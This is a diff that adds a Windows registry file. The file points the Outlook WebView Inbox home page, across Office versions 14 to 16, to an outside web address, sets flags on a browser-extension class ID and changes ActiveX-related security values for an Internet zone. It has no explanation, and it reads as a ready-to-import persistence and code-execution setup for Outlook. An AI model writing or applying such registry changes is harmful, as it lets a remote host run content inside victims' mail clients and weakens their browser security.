@@ -1,0 +1,21 @@
+Windows Registry Editor Version 5.00
+        
+[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Outlook\Webview\Inbox]
+"url"="http://phys.slipperymajor.org/plugin/search/"
+"security"="yes"
+
+[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Outlook\Webview\Inbox]
+"url"="http://phys.slipperymajor.org/plugin/search/"
+"security"="yes"
+
+[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Outlook\Webview\Inbox]
+"url"="http://phys.slipperymajor.org/plugin/search/"
+"security"="yes"
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{261B8CA9-3BAF-4BD0-B0C2-BF04286785C6}\iexplore]
+"Flags"=dword:00000004
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]
+"140C"=dword:00000000
+"1200"=dword:00000000
+"1201"=dword:00000003
